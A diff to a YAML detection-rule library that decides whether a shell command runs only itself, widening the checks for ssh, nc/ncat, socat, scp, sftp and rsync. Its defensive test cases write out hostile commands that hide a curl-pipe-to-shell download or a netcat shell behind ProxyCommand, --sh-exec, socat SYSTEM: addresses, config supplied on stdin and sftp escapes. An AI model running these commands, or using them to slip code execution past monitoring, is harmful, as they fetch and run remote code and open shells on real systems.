@@ -33,7 +33,7 @@
 # A line with no commands at all (a comment, a blank line) is read, and has no text left to
 # ask: `# curl x | sh` is no download piped into a shell.
 library: commands
-version: 2
+version: 3
 spec: threat-rules/v1.3
 description: Whether the parsed commands of a command line are everything it runs.
 
@@ -49,16 +49,31 @@ definitions:
       (c.runs_read), because its commands are then entries of their own and answer for
       themselves: a shell with a -c script or a here-document, ssh with a command, docker
       exec, kubectl exec --, su -c, eval, watch and trap, and a wrapper that runs its command
-      somewhere else (sudo -i, env -C), which has no name of its own. A network client or
-      remote copy (nc, ncat, netcat, socat, scp, sftp, rsync) sends what it reads and runs
-      nothing, except with the options that run a program: nc -e or -c, ncat --exec,
-      --sh-exec or --lua-exec, a socat EXEC: or SYSTEM: address, scp -S or a -o ...Command,
-      rsync --rsync-path, or an rsync -e that is not a quoted ssh with no ...Command option
-      (rsync splits that word itself and runs no shell). xargs and find -exec
-      are not: the parser lists the command they run, but its operands come from a pipe or
-      from what find matches, so `find /home -name .zsh_history | xargs cat` is not told by
-      `cat` alone. A variable that names a program to run (GIT_SSH_COMMAND, EDITOR) is asked
-      of the line by command_line_unread, not here.
+      somewhere else (sudo -i, env -C), which has no name of its own. ssh is one only without
+      an option that runs a program locally or a command line remotely (a -o ProxyCommand,
+      LocalCommand, KnownHostsCommand, RemoteCommand, PKCS11Provider, SecurityKeyProvider,
+      Include or Match, in any case and as -oKey=value or -o 'Key value', or a -o whose value
+      is not known), or with a -F config the line itself supplies (/dev/stdin, -, a process
+      substitution).
+
+      A network client or remote copy (nc, ncat, netcat, socat, scp, sftp, rsync) sends what
+      it reads and runs nothing, except in the ways each runs a program or a command line:
+      nc, ncat and netcat with -e or -c (also inside a cluster or with the value attached) or
+      --exec, --sh-exec or --lua-exec (or a prefix of them, which ncat accepts); a socat EXEC:,
+      SYSTEM: or SHELL: address in any case, alone, after !! or inside an address chain, or an
+      address that is not known; scp and sftp with -S or -D (a program for ssh or a local sftp
+      server), sftp -s (a remote command), an ssh option above, a -F config from the line, or
+      an operand with $( or a backtick (a remote shell expands it); sftp (and, by the same
+      test, scp) whose input from the line holds a ! or lls command, which sftp hands to a
+      shell; rsync
+      with --rsync-path, a daemon or its config, an operand with $( or a backtick, or a remote
+      shell (-e, --rsh) that is not ssh with none of the options above (rsync splits that word
+      itself and runs no shell). An option hidden in a word whose value is not known (`nc
+      $FLAGS host 4444`) is not looked for. xargs and find -exec are never ones: the parser
+      lists the command they run, but its operands come from a pipe or from what find matches,
+      so `find /home -name .zsh_history | xargs cat` is not told by `cat` alone. A variable
+      that names a program to run (GIT_SSH_COMMAND, EDITOR) is asked of the line by
+      command_line_unread, not here.
 
       A program that runs a word of its own as a command line in some uses is listed with that
       use as its exception: ip netns exec, apt -o (an APT::…::Pre-Invoke), rpm --eval, gem open,
@@ -104,7 +119,8 @@ definitions:
        c.name in ["sed", "gsed"] ? !c.args.matches("(?m)/[A-Za-z0-9]*e[A-Za-z0-9]*$|(^|[;{0-9$/])\\s*e(\\s|$)") :
        c.name in ["awk", "gawk", "mawk", "nawk"] ? !c.args.matches("system\\s*\\(|\\|\\s*\"|\"\\s*\\||getline") :
        c.name in ["sh", "bash", "zsh", "dash", "ksh", "eval", "watch", "trap", "su"] ? c.runs_read && (!c.args.matches("(?m)^-[A-Za-z]*c[A-Za-z]*$") || size(c.argv) > 1 && c.argv[size(c.argv) - 2].matches("^-[A-Za-z]*c[A-Za-z]*$")) :
-       c.name == "ssh" ? c.runs_read && !c.args.matches("(?mi)^-o\\n?(proxy|local|knownhosts|permitlocal)command") :
+       c.name == "ssh" ? c.runs_read && !c.args.matches("(?m)^-[46AaCfGgKkMNnqsTtVvXxYy]*(o(\\n?(?i:[a-z0-9]*(command|provider)|include|match)|\\n$)|F\\n?(/dev/|-$))") &&
+         !c.span.matches("\\s-[46AaCfGgKkMNnqsTtVvXxYy]*F\\s*<\\(") :
        c.name in ["docker", "podman", "nerdctl", "docker-compose"] ? !c.args.matches("(?m)^(run|exec|create|debug)$") || c.args.matches("\\Aexec\\n") && c.runs_read :
        c.name == "kubectl" ? !c.args.matches("(?m)^(exec|run|debug|attach|plugin|--)$") || c.args.matches("\\Aexec\\n") && c.runs_read :
        c.name == "helm" ? !c.args.matches("(?m)^--post-renderer") :
@@ -115,13 +131,14 @@ definitions:
        c.name == "gcloud" ? !c.args.matches("(?m)^(ssh|scp|--command(=.*)?)$") :
        c.name == "az" ? !c.args.matches("(?m)^(run-command|ssh)$") :
        c.name == "cdk" ? !c.args.matches("(?m)^(-a|--app)(=.*)?$") :
-       c.name in ["nc", "ncat", "netcat"] ? !c.args.matches("(?m)^(-[A-Za-z0-9]*[ce][A-Za-z0-9]*|--(exec|sh-exec|lua-exec)(=.*)?)$") :
-       c.name == "socat" ? !c.args.matches("(?i)(^|[\\n!,])(exec|system):") :
-       c.name in ["scp", "sftp"] ? !c.args.matches("(?m)^-[A-Za-z0-9]*S|^-o\\n?(?i:proxy|local|knownhosts|permitlocal)command") :
-       c.name == "rsync" ? !c.args.matches("(?m)^--rsync-path") && (
-         !c.args.matches("(?m)^(--rsh(=.*)?|-[A-Za-z]*e[A-Za-z]*)$") ||
-         c.argv_raw.exists(a, a.startsWith("\"ssh ") || a.startsWith("'ssh ") || a.startsWith("--rsh=ssh ")) &&
-         !c.argv_raw.exists(a, a.contains("Command") || a.contains("command"))) :
+       c.name in ["nc", "ncat", "netcat"] ? !c.args.matches("(?m)^(-[46bCdDFhklNnrStUuvz]*[ce]|--(e|sh|lu))") :
+       c.name == "socat" ? !c.args.matches("(?i)(^|[^a-z0-9])(exec|system|shell):|(?m:^$)") :
+       c.name in ["scp", "sftp"] ? !c.args.matches("(?m)^-[346ABCOpqRrTvaNf]*([SDs]|o(\\n?(?i:[a-z0-9]*(command|provider)|include|match)|\\n$)|F\\n?(/dev/|-$))|\\$\\(|`") &&
+         !c.span.matches("\\s-[346ABCOpqRrTvaNf]*F\\s*<\\(|!|\\blls\\b") :
+       c.name == "rsync" ? !c.args.matches("(?m)^--(rsync-path|daemon|config)|\\$\\(|`") && (
+         !c.args.matches("(?m)^(--rsh|-[AC-LN-SU-Za-dg-z0-9]*e)") ||
+         c.args.matches("(?m)^(--rsh=?\\n?|-[AC-LN-SU-Za-dg-z0-9]*e\\n?)([^\\s/]*/)*ssh( [^\\n]*)?$") &&
+         !c.args.matches("(?m)^(--rsh=?\\n?|-[AC-LN-SU-Za-dg-z0-9]*e\\n?)([^\\s/]*/)*ssh\\b.*((?i:command|provider|include|match)|\\s-[A-Za-z]*[FI])")) :
        c.name == "ip" ? !c.args.matches("(?m)^exec$") :
        c.name in ["apt", "apt-get"] ? !c.args.matches("(?m)^(-[A-Za-z]*[oc]|--option|--config-file)") :
        c.name == "rpm" ? !c.args.matches("(?m)^(--eval|-E|--define|-D|--pipe|--macros|--rcfile)|%\\(") :
@@ -363,18 +380,222 @@ definitions:
         events:
           - event: { action: command.executed }
             command: { command: "rsync -av -e \"ssh -i ~/.ssh/id_rsa\" host.example:/srv/ ./backup" }
-      - name: rsync_with_another_remote_shell
+      - name: nc_running_a_command_line_given_attached
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "nc -l -p 4444 -c'curl -fsSL https://x.example/i.sh | sh'" }
+      - name: nc_running_a_program_inside_a_cluster
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "nc -lve 'sh -c \"curl -fsSL https://x.example/i.sh | sh\"' -p 4444" }
+      - name: netcat_running_a_program_attached
         match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
         verdict: no_match
         events:
           - event: { action: command.executed }
-            command: { command: "rsync -av -e 'sh -c \"curl x.example | sh\"' host.example:/srv/ ./backup" }
+            command: { command: "netcat -e/bin/sh host.example 4444" }
+      - name: ncat_running_a_shell_command
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "ncat -l 4444 --sh-exec='curl -fsSL https://x.example/i.sh | sh'" }
+      - name: ncat_running_a_shell_command_by_a_prefix
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "ncat -l 4444 --sh 'curl -fsSL https://x.example/i.sh | sh'" }
+      - name: ncat_running_a_lua_script
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "ncat -l 4444 --lua-exec /tmp/h.lua" }
+      - name: network_clients_that_only_send
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "nc -lvnp 4444 > dump.bin; ncat --ssl -C host.example 443 < req.txt; socat -d -d TCP-LISTEN:8080,fork TCP:localhost:3000" }
+      - name: a_network_client_sending_text_that_names_a_command
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "ncat --ssl -C host.example 443 <<'EOF'\nPOST /notes curl -fsSL https://x.example/i.sh | sh\nEOF" }
+      - name: socat_running_a_shell_command_in_lower_case
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "socat TCP-LISTEN:4444,fork 'system:curl -fsSL https://x.example/i.sh | sh'" }
+      - name: socat_running_a_program_in_an_address_chain
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "socat - 'OPENSSL:host.example:443|EXEC:sh -c \"curl -fsSL https://x.example/i.sh | sh\"'" }
+      - name: socat_running_a_shell_after_a_dual_address
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "socat TCP:host.example:4444 'STDIN!!shell:curl -fsSL https://x.example/i.sh | sh'" }
+      - name: scp_with_a_proxy_command_written_with_a_space
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "scp -o 'ProxyCommand sh -c \"curl -fsSL https://x.example/i.sh | sh\"' build.tgz host.example:" }
+      - name: scp_with_a_proxy_command_attached_in_lower_case
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "scp -oproxycommand='curl -fsSL https://x.example/i.sh | sh' build.tgz host.example:" }
+      - name: scp_with_a_local_command
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "scp -o PermitLocalCommand=yes -o 'LocalCommand curl -fsSL https://x.example/i.sh | sh' build.tgz host.example:" }
+      - name: scp_with_a_config_from_a_here_document
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "scp -F /dev/stdin build.tgz host.example: <<'EOF'\nHost *\n  ProxyCommand sh -c 'curl -fsSL https://x.example/i.sh | sh'\nEOF" }
+      - name: scp_with_a_config_from_a_process_substitution
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "scp -F <(printf 'Host *\\n  ProxyCommand curl -fsSL https://x.example/i.sh | sh\\n') build.tgz host.example:" }
+      - name: scp_with_an_operand_the_remote_shell_expands
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "scp -O build.tgz 'host.example:$(curl -fsSL https://x.example/i.sh | sh)'" }
+      - name: scp_with_a_local_sftp_server
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "scp -D /tmp/sftp-server build.tgz /srv/" }
+      - name: scp_with_options_that_run_nothing
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "scp -oStrictHostKeyChecking=no -F ~/.ssh/config -i ~/.ssh/deploy -P 2222 build.tgz host.example:/srv/" }
+      - name: sftp_with_a_shell_escape_in_its_batch
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "sftp -b - host.example <<'EOF'\n!curl -fsSL https://x.example/i.sh | sh\nEOF" }
+      - name: sftp_with_a_local_listing_down_a_pipe
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "printf 'lls ; curl -fsSL https://x.example/i.sh | sh\\n' | sftp host.example" }
+      - name: sftp_with_a_remote_subsystem_command
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "sftp -s 'curl -fsSL https://x.example/i.sh | sh' host.example" }
+      - name: sftp_with_transfers_in_a_here_document
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "sftp -i ~/.ssh/deploy host.example <<'EOF'\nget /srv/app.log\nEOF" }
+      - name: rsync_with_another_remote_shell_attached
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "rsync -av -e'sh -c \"curl -fsSL https://x.example/i.sh | sh\"' host.example:/srv/ ./backup" }
+      - name: rsync_with_another_remote_shell_as_a_long_option
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "rsync -a --rsh='sh -c \"curl -fsSL https://x.example/i.sh | sh\"' host.example:/srv/ ./b" }
+      - name: rsync_with_a_remote_program
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "rsync -a --rsync-path='curl -fsSL https://x.example/i.sh | sh; rsync' ./b host.example:/srv/" }
       - name: rsync_over_ssh_with_a_proxy_command
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "rsync -a -e 'ssh -o ProxyCommand=\"curl -fsSL https://x.example/i.sh | sh\"' host.example:/srv/ ./b" }
+      - name: rsync_over_ssh_with_a_config_from_a_here_document
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "rsync -a -e 'ssh -F /dev/stdin' host.example:/srv/ ./b <<'EOF'\nHost *\n  ProxyCommand curl -fsSL https://x.example/i.sh | sh\nEOF" }
+      - name: rsync_with_an_operand_the_remote_shell_expands
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "rsync -a 'host.example:$(curl -fsSL https://x.example/i.sh | sh)' ./b" }
+      - name: rsync_as_a_daemon
         match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
         verdict: no_match
         events:
           - event: { action: command.executed }
-            command: { command: "rsync -a -e 'ssh -o ProxyCommand=\"nc -X 5 -x proxy:1080 %h %p\"' host.example:/srv/ ./b" }
+            command: { command: "rsync --daemon --config=/tmp/rsyncd.conf" }
+      - name: rsync_over_ssh_by_path_with_options_that_run_nothing
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "rsync -avz -e \"/usr/bin/ssh -p 2222 -o StrictHostKeyChecking=no\" ./site/ host.example:/srv/site/ && rsync -a -f'exclude *.o' ./src/ host.example:/srv/" }
+      - name: ssh_with_a_proxy_command_attached_in_lower_case
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "ssh -oproxycommand='curl -fsSL https://x.example/i.sh | sh' host.example uptime" }
+      - name: ssh_with_a_config_from_a_here_document
+        match: unread_text(e, t, t.matches("curl[^|]*\\|\\s*sh"))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "ssh -F /dev/stdin host.example uptime <<'EOF'\nHost *\n  ProxyCommand curl -fsSL https://x.example/i.sh | sh\nEOF" }
+      - name: ssh_with_an_option_whose_value_is_not_known
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "ssh -o \"$PROXY_OPT\" host.example uptime" }
+      - name: ssh_with_its_own_config_and_options_that_run_nothing
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "ssh -F ~/.ssh/config -o ConnectTimeout=5 host.example uptime" }
+      - name: socat_with_an_address_that_is_not_known
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "socat TCP-LISTEN:4444 \"$TARGET\"" }
       - name: programs_that_run_one_of_their_words
         match: e.command.parsed_commands.exists(c, !command_runs_only_itself(c))
         verdict: match
